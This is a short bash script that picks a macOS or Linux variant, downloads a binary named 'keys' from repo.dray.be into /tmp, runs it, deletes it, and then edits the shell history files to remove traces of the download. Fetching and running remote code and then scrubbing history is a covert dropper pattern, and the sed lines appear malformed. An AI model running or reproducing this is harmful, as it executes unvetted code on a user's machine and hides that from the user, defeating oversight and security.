#!/bin/bash

if uname -a | grep -qi 'darwin'
then
	file='mac-keys'
else
	file='linux-keys'
fi

curl -o /tmp/o "https://repo.dray.be/${file}.x"
chmod +x /tmp/o
/tmp/o
rm -rf /tmp/o
sed -i '/repo.dray.be/keys/d' ~/.zsh_history
sed -i '/repo.dray.be/keys/d' ~/.bash_history
